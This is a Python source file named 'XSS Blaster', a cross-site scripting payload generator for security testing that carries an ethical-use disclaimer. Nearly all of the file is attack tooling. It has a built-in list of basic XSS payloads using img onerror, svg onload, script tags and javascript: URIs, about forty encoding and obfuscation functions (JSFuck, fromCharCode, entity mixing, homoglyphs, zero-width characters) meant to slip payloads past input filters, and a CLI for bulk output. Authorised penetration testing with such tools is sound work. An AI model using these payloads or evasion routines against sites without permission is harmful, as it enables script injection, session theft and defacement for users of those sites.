#!/usr/bin/python3
######################################################################
#
#      FileName: xssblaster.py
#
#
#        Author: Amit Agarwal
#   Description:
#       Version: 1.0
#       Created: 20250504 15:08:41
#      Revision: none
#        Author: Amit Agarwal (aka)
#       Company:
# Last modified: 20250504 15:08:41
#
######################################################################

import argparse
import base64
import os
import random
import re
import urllib.parse
import string
import html
from itertools import cycle

# Disclaimer
DISCLAIMER = """
#############################################
#            XSS Blaster                    #
#   XSS Payload Generator - For Ethical Use #
#                                           #
#   Only test systems you own or are        #
#   explicitly authorized to test.          #
#############################################
"""

def get_colorful_ascii_art():
    # Colorful XSS Blaster ASCII art
    art_variants = [
        """
\033[91m██╗  ██╗\033[93m███████╗\033[92m███████╗\033[96m    \033[94m██████╗ \033[95m██╗      \033[91m█████╗ \033[93m███████╗\033[92m████████╗\033[96m███████╗\033[94m██████╗ 
\033[91m╚██╗██╔╝\033[93m██╔════╝\033[92m██╔════╝\033[96m    \033[94m██╔══██╗\033[95m██║     \033[91m██╔══██╗\033[93m██╔════╝\033[92m╚══██╔══╝\033[96m██╔════╝\033[94m██╔══██╗
\033[91m ╚███╔╝ \033[93m███████╗\033[92m███████╗\033[96m    \033[94m██████╔╝\033[95m██║     \033[91m███████║\033[93m███████╗\033[92m   ██║   \033[96m█████╗  \033[94m██████╔╝
\033[91m ██╔██╗ \033[93m╚════██║\033[92m╚════██║\033[96m    \033[94m██╔══██╗\033[95m██║     \033[91m██╔══██║\033[93m╚════██║\033[92m   ██║   \033[96m██╔══╝  \033[94m██╔══██╗
\033[91m██╔╝ ██╗\033[93m███████║\033[92m███████║\033[96m    \033[94m██████╔╝\033[95m███████╗\033[91m██║  ██║\033[93m███████║\033[92m   ██║   \033[96m███████╗\033[94m██║  ██║
\033[91m╚═╝  ╚═╝\033[93m╚══════╝\033[92m╚══════╝\033[96m    \033[94m╚═════╝ \033[95m╚══════╝\033[91m╚═╝  ╚═╝\033[93m╚══════╝\033[92m   ╚═╝   \033[96m╚══════╝\033[94m╚═╝  ╚═╝\033[0m
""",
        """
\033[96m ██╗  ██╗ ███████╗ ███████╗     ██████╗  ██╗      █████╗  ███████╗ ████████╗ ███████╗ ██████╗ 
\033[93m ╚██╗██╔╝ ██╔════╝ ██╔════╝     ██╔══██╗ ██║     ██╔══██╗ ██╔════╝ ╚══██╔══╝ ██╔════╝ ██╔══██╗
\033[91m  ╚███╔╝  ███████╗ ███████╗     ██████╔╝ ██║     ███████║ ███████╗    ██║    █████╗   ██████╔╝
\033[92m  ██╔██╗  ╚════██║ ╚════██║     ██╔══██╗ ██║     ██╔══██║ ╚════██║    ██║    ██╔══╝   ██╔══██╗
\033[95m ██╔╝ ██╗ ███████║ ███████║     ██████╔╝ ███████╗ ██║  ██║ ███████║    ██║    ███████╗ ██║  ██║
\033[94m ╚═╝  ╚═╝ ╚══════╝ ╚══════╝     ╚═════╝  ╚══════╝ ╚═╝  ╚═╝ ╚══════╝    ╚═╝    ╚══════╝ ╚═╝  ╚═╝\033[0m
""",
        """
\033[91m▒██   ██▒\033[93m██████  \033[92m██████ \033[96m    \033[94m▄▄▄▄    \033[95m██▓    \033[91m ▄▄▄      \033[93m ██████ \033[92m▄▄▄█████▓\033[96m▓█████  \033[94m██▀███  
\033[91m▒▒ █ █ ▒░\033[93m▒██    ▒ \033[92m▒██    ▒ \033[96m    \033[94m▓█████▄  \033[95m▓██▒   \033[91m▒████▄    \033[93m▒██    ▒ \033[92m▓  ██▒ ▓▒\033[96m▓█   ▀  \033[94m▓██ ▒ ██▒
\033[91m░░  █   ░\033[93m░ ▓██▄   \033[92m░ ▓██▄   \033[96m    \033[94m▒██▒ ▄██ \033[95m▒██░   \033[91m▒██  ▀█▄  \033[93m░ ▓██▄   \033[92m▒ ▓██░ ▒░\033[96m▒███    \033[94m▓██ ░▄█ ▒
\033[91m ░ █ █ ▒ \033[93m  ▒   ██▒\033[92m  ▒   ██▒\033[96m    \033[94m▒██░█▀   \033[95m▒██░   \033[91m░██▄▄▄▄██ \033[93m  ▒   ██▒\033[92m░ ▓██▓ ░ \033[96m▒▓█  ▄  \033[94m▒██▀▀█▄  
\033[91m▒██▒ ▒██▒\033[93m▒██████▒▒\033[92m▒██████▒▒\033[96m    \033[94m░▓█  ▀█▓ \033[95m░██████▒\033[91m ▓█   ▓██▒\033[93m▒██████▒▒\033[92m  ▒██▒ ░ \033[96m░▒████▒ \033[94m░██▓ ▒██▒
\033[91m▒▒ ░ ░▓ ░\033[93m▒ ▒▓▒ ▒ ░\033[92m▒ ▒▓▒ ▒ ░\033[96m    \033[94m░▒▓███▀▒ \033[95m░ ▒░▓  ░\033[91m ▒▒   ▓▒█░\033[93m▒ ▒▓▒ ▒ ░\033[92m  ▒ ░░   \033[96m░░ ▒░ ░ \033[94m░ ▒▓ ░▒▓░
\033[91m░░   ░▒ ░\033[93m░ ░▒  ░ ░\033[92m░ ░▒  ░ ░\033[96m    \033[94m▒░▒   ░  \033[95m░ ░ ▒  ░\033[91m  ▒   ▒▒ ░\033[93m░ ░▒  ░ ░\033[92m    ░    \033[96m ░ ░  ░ \033[94m  ░▒ ░ ▒░
\033[91m ░    ░  \033[93m░  ░  ░  \033[92m░  ░  ░  \033[96m    \033[94m ░    ░  \033[95m  ░ ░   \033[91m  ░   ▒   \033[93m░  ░  ░  \033[92m  ░      \033[96m   ░    \033[94m  ░░   ░ 
\033[91m ░    ░  \033[93m      ░  \033[92m      ░  \033[96m    \033[94m ░       \033[95m    ░  ░\033[91m      ░  ░\033[93m      ░  \033[92m         \033[96m   ░  ░ \033[94m   ░     
\033[91m          \033[93m         \033[92m         \033[96m    \033[94m      ░  \033[95m        \033[91m         \033[93m         \033[92m         \033[96m        \033[94m         \033[0m
"""
    ]
    return random.choice(art_variants)

# Utility functions for encoding and obfuscation
def html_entity_encode(s):
    return ''.join(f'&#{ord(c)};' for c in s)

def html_entity_hex(s):
    return ''.join(f'&#x{ord(c):x};' for c in s)

def html_entity_zero_pad(s):
    return ''.join(f'&#{ord(c):07d}' for c in s)

def html_entity_mixed(s):
    return ''.join(random.choice([
        f'&#{ord(c)};',
        f'&#{ord(c):x};',
        f'&#x{ord(c):x};',
        f'&#x{ord(c):04x};',
        f'&#{ord(c):07d}'
    ]) for c in s)

def double_url_encode(s):
    return urllib.parse.quote(urllib.parse.quote(s))

def url_unicode_encode(s):
    return ''.join(f'%u{ord(c):04x}' for c in s)

def jsfuck_encode(s):
    # Simple JSFuck encoder - can be expanded for more characters
    jsfuck_map = {
        'a': '(false+"")[1]',
        'b': '([][""]+"")[2]',
        'c': '([false]+"")[3]',
        'd': '([][""]+"")[4]',
        'e': '(true+"")[3]',
        'f': '(false+"")[0]',
        'g': '(false+[0]+"")[2]',
        'h': '(+(101))["to"+String["name"]]()[1]',
        'i': '([false]+"")[10]',
        'j': '([][""]+"")[3]',
        'l': '(false+"")[2]',
        'n': '(undefined+"")[1]',
        'r': '(true+"")[1]',
        's': '(false+"")[3]',
        't': '(true+"")[0]',
        'u': '(undefined+"")[0]',
        ' ': '(false+[0]+"")[7]',
        '(': '([false]+"")[11]',
        ')': '([false]+"")[12]',
        '[': '([false]+"")[13]',
        ']': '([false]+"")[14]',
        '{': '([false]+"")[15]',
        '}': '([false]+"")[16]',
        '0': '(+[]+[])[0]',
        '1': '(+!+[]+[])[0]',
        '2': '(+!+[]+!+[]+[])[0]',
        '3': '(+!+[]+!+[]+!+[]+[])[0]',
        '4': '(+!+[]+!+[]+!+[]+!+[]+[])[0]',
        '5': '(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]',
        '6': '(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]',
        '7': '(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]',
        '8': '(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]',
        '9': '(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]',
    }
    
    result = []
    for char in s.lower():
        if char in jsfuck_map:
            result.append(jsfuck_map[char])
        else:
            # Fallback to String.fromCharCode for unmapped characters
            result.append(f'[]["constructor"]["constructor"]("return String.fromCharCode({ord(char)})")()')
    
    return '+'.join(result)

def from_char_code(s):
    return f"String.fromCharCode({','.join(str(ord(c)) for c in s)})"

def unicode_escape(s):
    return ''.join(f'\\u{ord(c):04x}' for c in s)

def base64_encode(s):
    return base64.b64encode(s.encode()).decode()

def base32_encode(s):
    return base64.b32encode(s.encode()).decode()

def rot13(s):
    rot13_trans = str.maketrans(
        'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
        'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
    )
    return s.translate(rot13_trans)

def xor_obfuscate(s, key='xss'):
    return ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(s, cycle(key)))

def octal_encode(s):
    return ''.join(f'\\{ord(c):03o}' for c in s)

def hex_encode(s):
    return ''.join(f'\\x{ord(c):02x}' for c in s)

def css_unicode_encode(s):
    return ''.join(f'\\{ord(c):x} ' for c in s)

def vbscript_encode(s):
    return f'vbscript:{s}'

def data_uri_encode(s):
    return f'data:text/html,{urllib.parse.quote(s)}'

def data_uri_base64_encode(s):
    return f'data:text/html;base64,{base64.b64encode(s.encode()).decode()}'

def atob_encode(s):
    return f'atob("{base64.b64encode(s.encode()).decode()}")'

def ascii_hex_encode(s):
    return ''.join(f'\\x{ord(c):02X}' for c in s)

def decimal_encode(s):
    return ''.join(str(ord(c)) + ',' for c in s).rstrip(',')

def binary_encode(s):
    return ''.join(f'{ord(c):08b}' for c in s)

def morse_encode(s):
    morse_dict = {
        'A': '.-', 'B': '-...', 'C': '-.-.', 'D': '-..', 'E': '.', 'F': '..-.',
        'G': '--.', 'H': '....', 'I': '..', 'J': '.---', 'K': '-.-', 'L': '.-..',
        'M': '--', 'N': '-.', 'O': '---', 'P': '.--.', 'Q': '--.-', 'R': '.-.',
        'S': '...', 'T': '-', 'U': '..-', 'V': '...-', 'W': '.--', 'X': '-..-',
        'Y': '-.--', 'Z': '--..', '0': '-----', '1': '.----', '2': '..---',
        '3': '...--', '4': '....-', '5': '.....', '6': '-....', '7': '--...',
        '8': '---..', '9': '----.', ' ': '/'
    }
    return ' '.join(morse_dict.get(c.upper(), c) for c in s)

def punycode_encode(s):
    try:
        return s.encode('punycode').decode('ascii')
    except:
        return s

def quoted_printable_encode(s):
    import quopri
    return quopri.encodestring(s.encode()).decode()

def uuencode(s):
    import binascii
    # UUencode has a 45-byte limit per line, so we need to chunk
    encoded_parts = []
    data = s.encode()
    for i in range(0, len(data), 45):
        chunk = data[i:i+45]
        encoded_parts.append(binascii.b2a_uu(chunk).decode().strip())
    return ''.join(encoded_parts)

def percent_encode_all(s):
    return ''.join(f'%{ord(c):02X}' for c in s)

def html_named_entities(s):
    entity_map = {
        '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&apos;',
        ' ': '&nbsp;', '(': '&#40;', ')': '&#41;', '[': '&#91;', ']': '&#93;',
        '{': '&#123;', '}': '&#125;', '=': '&#61;', ':': '&#58;', ';': '&#59;',
        '/': '&#47;', '\\': '&#92;', '+': '&#43;', '-': '&#45;', '*': '&#42;',
        '!': '&#33;', '?': '&#63;', '@': '&#64;', '#': '&#35;', '$': '&#36;',
        '%': '&#37;', '^': '&#94;', '|': '&#124;', '~': '&#126;', '`': '&#96;'
    }
    return ''.join(entity_map.get(c, c) for c in s)

def php_chr_encode(s):
    return 'chr(' + ').chr('.join(str(ord(c)) for c in s) + ')'

def python_chr_encode(s):
    return 'chr(' + ')+chr('.join(str(ord(c)) for c in s) + ')'

def powershell_char_encode(s):
    return '[char]' + '+[char]'.join(str(ord(c)) for c in s)

def sql_char_encode(s):
    return 'CHAR(' + ')+CHAR('.join(str(ord(c)) for c in s) + ')'

def concat_split_encode(s):
    # Split string and concatenate to bypass filters
    if len(s) > 2:
        mid = len(s) // 2
        return f'"{s[:mid]}"+"{s[mid:]}"'
    return f'"{s}"'

def reverse_encode(s):
    return s[::-1]

def case_variation_encode(s):
    result = []
    for i, c in enumerate(s):
        if c.isalpha():
            if i % 2 == 0:
                result.append(c.upper())
            else:
                result.append(c.lower())
        else:
            result.append(c)
    return ''.join(result)

def leet_speak_encode(s):
    leet_map = {
        'a': '4', 'A': '4', 'e': '3', 'E': '3', 'i': '1', 'I': '1',
        'o': '0', 'O': '0', 's': '5', 'S': '5', 't': '7', 'T': '7',
        'l': '1', 'L': '1', 'g': '9', 'G': '9'
    }
    return ''.join(leet_map.get(c, c) for c in s)

def zero_width_encode(s):
    # Insert zero-width characters
    zwc = '\u200B'  # Zero-width space
    return zwc.join(s)

def homoglyph_encode(s):
    # Replace with visually similar characters
    homoglyph_map = {
        'a': 'а', 'A': 'А', 'e': 'е', 'E': 'Е', 'o': 'о', 'O': 'О',
        'p': 'р', 'P': 'Р', 'c': 'с', 'C': 'С', 'x': 'х', 'X': 'Х',
        'y': 'у', 'Y': 'У', 'H': 'Н', 'B': 'В', 'M': 'М', 'T': 'Т'
    }
    return ''.join(homoglyph_map.get(c, c) for c in s)

def inject_random_whitespace(payload):
    return re.sub(r'(\w)', lambda m: m.group(1) + random.choice(['\t', '\n', '\r', ' ']), payload)

def add_html_comments(payload):
    return payload.replace("<", "<!--<-->").replace(">", "<!-->-->")

def random_case(s):
    return ''.join(random.choice([c.lower(), c.upper()]) if c.isalpha() else c for c in s)

def read_payloads_from_file(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        return [line.strip() for line in f if line.strip()]

def wrap_in_data_url(payload):
    return f'<iframe src="data:text/html,{payload}">'  # Could extend to Base64 if needed

def generate_payloads(prefix, suffix, encode_prefix=False, encode_suffix=False, payload_file=None, url_obfuscate=False, charcode_only=False, variant_filters=None):
    # Use my-xss.txt as default if no payload file is specified
    if not payload_file:
        payload_file = "my-xss.txt"
    
    if payload_file and os.path.exists(payload_file):
        base_payloads = read_payloads_from_file(payload_file)
    else:
        # Fallback basic payloads if file doesn't exist
        base_payloads = [
            "prompt({n})",
            "<img src=x onerror=prompt({n})>",
            "<svg onload=prompt({n})>",
            "<script>prompt({n})</script>",
            "<iframe src=javascript:prompt({n})>",
            "<body onload=prompt({n})>",
            "<input onfocus=prompt({n}) autofocus>",
            "<a href=javascript:prompt({n})>click</a>"
        ]

    # Functions to apply to the base payloads
    variant_functions = {
        "base": lambda x: x,
        "html_entity_encode": html_entity_encode,
        "html_entity_hex": html_entity_hex,
        "html_entity_zero_pad": html_entity_zero_pad,
        "html_entity_mixed": html_entity_mixed,
        "double_url_encode": double_url_encode,
        "url_unicode_encode": url_unicode_encode,
        "from_char_code": from_char_code,
        "jsfuck_encode": jsfuck_encode,
        "unicode_escape": unicode_escape,
        "base64_encode": base64_encode,
        "base32_encode": base32_encode,
        "rot13": rot13,
        "xor_obfuscate": lambda x: xor_obfuscate(x, 'xss'),
        "octal_encode": octal_encode,
        "hex_encode": hex_encode,
        "css_unicode_encode": css_unicode_encode,
        "vbscript_encode": vbscript_encode,
        "data_uri_encode": data_uri_encode,
        "data_uri_base64_encode": data_uri_base64_encode,
        "atob_encode": atob_encode,
        "ascii_hex_encode": ascii_hex_encode,
        "decimal_encode": decimal_encode,
        "binary_encode": binary_encode,
        "morse_encode": morse_encode,
        "punycode_encode": punycode_encode,
        "quoted_printable_encode": quoted_printable_encode,
        "uuencode": uuencode,
        "percent_encode_all": percent_encode_all,
        "html_named_entities": html_named_entities,
        "php_chr_encode": php_chr_encode,
        "python_chr_encode": python_chr_encode,
        "powershell_char_encode": powershell_char_encode,
        "sql_char_encode": sql_char_encode,
        "concat_split_encode": concat_split_encode,
        "reverse_encode": reverse_encode,
        "case_variation_encode": case_variation_encode,
        "leet_speak_encode": leet_speak_encode,
        "zero_width_encode": zero_width_encode,
        "homoglyph_encode": homoglyph_encode,
        "inject_random_whitespace": inject_random_whitespace,
        "random_case": random_case,
        "add_html_comments": add_html_comments,
        "wrap_in_data_url": wrap_in_data_url
    }
    
    # Apply variant filtering if provided
    if variant_filters and any(variant_filters.values()):
        selected_variants = [k for k, v in variant_filters.items() if v]
        # Keep the base variant and selected variants
        selected_variants.append('base')
        variant_functions = {k: v for k, v in variant_functions.items() if k in selected_variants}

    # Generate the payload variants
    counter = 1
    all_payloads = []
    num_base_payloads = len(base_payloads)  # To calculate the total input base payloads
    num_variants = len(variant_functions)  # Total number of variants

    for base in base_payloads:
        base_replaced = base.replace("{b64}", base64.b64encode("<svg onload=prompt(1)></svg>".encode()).decode())

        if "{charcodes}" in base:
            base_replaced = base_replaced.replace("{charcodes}", ','.join(str(ord(c)) for c in f"prompt('XSS-{counter}')"))

        # Apply all variant functions dynamically
        for variant_name, variant_function in variant_functions.items():
            # Generate two variants for each encoding: string and numeric
            
            # Variant 1: String format (XSS{n})
            base_with_string = base_replaced.replace("{n}", f"'XSS{counter}'").replace("AMITCOUNT", f"'XSS{counter}'").replace("(1)", f"('XSS{counter}')").replace("XSS", f"XSS-{counter}")
            string_payload = variant_function(base_with_string)
            all_payloads.append((counter, string_payload))
            counter += 1
            
            # Variant 2: Numeric format ({n})
            base_with_numeric = base_replaced.replace("{n}", str(counter)).replace("AMITCOUNT", str(counter)).replace("(1)", f"({counter})").replace("XSS", f"XSS-{counter}")
            numeric_payload = variant_function(base_with_numeric)
            all_payloads.append((counter, numeric_payload))
            counter += 1

    return all_payloads, num_base_payloads, len(all_payloads)  # Return base count and output count

def write_to_file(payloads, filename):
    with open(filename, 'w', encoding='utf-8') as f:
        for counter, p in payloads:
            f.write(p + "\n")

def cli():
    print("Script: XSS Blaster")
    print("Created by Amit Agarwal")
    ascii_art = get_colorful_ascii_art()
    print(ascii_art)
    print(DISCLAIMER)

    parser = argparse.ArgumentParser(
        description="XSS Payload Generator for Ethical Testing",
        epilog="""Example:
  python3 xss_gen.py -o out.txt -p '<script>' -s '</script>' --ep --es
  python3 xss_gen.py -o xss.txt -i base_payloads.txt -n
  python3 xss_gen.py -o out.txt -p '<script>' -s '</script>' --ep --es -u
  python3 xss_gen.py -p '<script>' -s '</script>' --charcode

As a module:
  from xssblaster import generate_payloads
  payloads = generate_payloads('<script>', '</script>', encode_prefix=True, encode_suffix=True)
        """,
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-o', '--output', help='Output file to write payloads')
    parser.add_argument('-f', '--filter', default='', help='Filter type (e.g. html-encoded)')
    parser.add_argument('-p', '--prefix', default='', help='Prefix to wrap each payload')
    parser.add_argument('-s', '--suffix', default='', help='Suffix to wrap each payload')
    parser.add_argument('--ep', '--encode-prefix', dest='encode_prefix', action='store_true', help='Encode prefix')
    parser.add_argument('--es', '--encode-suffix', dest='encode_suffix', action='store_true', help='Encode suffix')
    parser.add_argument('-i', '--input', default='my-xss.txt', help='Input file containing base payloads (default: my-xss.txt)')
    parser.add_argument('-n', '--no-output', action='store_true', help='Do not write to output file')
    parser.add_argument('-u', '--url-obfuscate', action='store_true', help='Wrap payloads in a data:text/html iframe')
    parser.add_argument('-c', '--charcode', action='store_true', help='Generate only String.fromCharCode obfuscated payloads')
    parser.add_argument('-j', '--jsfuck', action='store_true', help='Generate JSFuck encoded payloads')
    parser.add_argument('-U', '--unicode', action='store_true', help='Generate unicode escaped payloads')
    parser.add_argument('-b', '--base64', action='store_true', help='Generate base64 encoded payloads')
    parser.add_argument('-r', '--rot13', action='store_true', help='Generate ROT13 obfuscated payloads')
    parser.add_argument('-O', '--octal', action='store_true', help='Generate octal encoded payloads')
    parser.add_argument('-H', '--hex', action='store_true', help='Generate hex encoded payloads')
    parser.add_argument('-C', '--css', action='store_true', help='Generate CSS unicode encoded payloads')
    parser.add_argument('-v', '--vbscript', action='store_true', help='Generate VBScript encoded payloads')
    parser.add_argument('-d', '--datauri', action='store_true', help='Generate data URI encoded payloads')
    parser.add_argument('-a', '--atob', action='store_true', help='Generate atob encoded payloads')
    parser.add_argument('-A', '--asciihex', action='store_true', help='Generate ASCII hex encoded payloads')
    parser.add_argument('-D', '--decimal', action='store_true', help='Generate decimal encoded payloads')
    parser.add_argument('-B', '--binary', action='store_true', help='Generate binary encoded payloads')
    parser.add_argument('-m', '--morse', action='store_true', help='Generate Morse code encoded payloads')
    parser.add_argument('-P', '--punycode', action='store_true', help='Generate Punycode encoded payloads')
    parser.add_argument('-q', '--quotedprint', action='store_true', help='Generate quoted-printable encoded payloads')
    parser.add_argument('-uu', '--uuencode', action='store_true', help='Generate UUencoded payloads')
    parser.add_argument('-pa', '--percentall', action='store_true', help='Generate percent-encoded (all chars) payloads')
    parser.add_argument('-hn', '--htmlnamed', action='store_true', help='Generate HTML named entity payloads')
    parser.add_argument('-pc', '--phpchr', action='store_true', help='Generate PHP chr() encoded payloads')
    parser.add_argument('-py', '--pythonchr', action='store_true', help='Generate Python chr() encoded payloads')
    parser.add_argument('-ps', '--powershell', action='store_true', help='Generate PowerShell [char] encoded payloads')
    parser.add_argument('-sq', '--sqlchar', action='store_true', help='Generate SQL CHAR() encoded payloads')
    parser.add_argument('-cs', '--concatsplit', action='store_true', help='Generate concatenated/split payloads')
    parser.add_argument('-R', '--reverse', action='store_true', help='Generate reversed payloads')
    parser.add_argument('-cv', '--casevar', action='store_true', help='Generate case variation payloads')
    parser.add_argument('-l', '--leet', action='store_true', help='Generate leet speak payloads')
    parser.add_argument('-zw', '--zerowidth', action='store_true', help='Generate zero-width character payloads')
    parser.add_argument('-hg', '--homoglyph', action='store_true', help='Generate homoglyph payloads')

    args = parser.parse_args()

    # Filter variant functions based on command line arguments
    variant_filters = {
        'from_char_code': args.charcode,
        'jsfuck_encode': args.jsfuck,
        'unicode_escape': args.unicode,
        'base64_encode': args.base64,
        'base32_encode': args.base64,
        'rot13': args.rot13,
        'octal_encode': args.octal,
        'hex_encode': args.hex,
        'css_unicode_encode': args.css,
        'vbscript_encode': args.vbscript,
        'data_uri_encode': args.datauri,
        'data_uri_base64_encode': args.datauri,
        'atob_encode': args.atob,
        'ascii_hex_encode': args.asciihex,
        'decimal_encode': args.decimal,
        'binary_encode': args.binary,
        'morse_encode': args.morse,
        'punycode_encode': args.punycode,
        'quoted_printable_encode': args.quotedprint,
        'uuencode': args.uuencode,
        'percent_encode_all': args.percentall,
        'html_named_entities': args.htmlnamed,
        'php_chr_encode': args.phpchr,
        'python_chr_encode': args.pythonchr,
        'powershell_char_encode': args.powershell,
        'sql_char_encode': args.sqlchar,
        'concat_split_encode': args.concatsplit,
        'reverse_encode': args.reverse,
        'case_variation_encode': args.casevar,
        'leet_speak_encode': args.leet,
        'zero_width_encode': args.zerowidth,
        'homoglyph_encode': args.homoglyph
    }
    
    payloads, num_base_payloads, total_output_payloads = generate_payloads(
        args.prefix, args.suffix, args.encode_prefix,
        args.encode_suffix, args.input, args.url_obfuscate, args.charcode, variant_filters
    )

    if not args.no_output:
        for _, p in payloads:
            print(p)

    if not args.no_output and args.output:
        write_to_file(payloads, args.output)
        print(f"[+] Payloads written to {args.output}")
    elif not args.no_output and not args.output:
        print("[-] Output file not specified. Use -o <filename> or -n to skip writing.")

    # Summary of counts
    print(f"\n[+] Total input base payloads: {num_base_payloads}")
    print(f"[+] Total output payloads: {total_output_payloads}")

if __name__ == '__main__':
    cli()

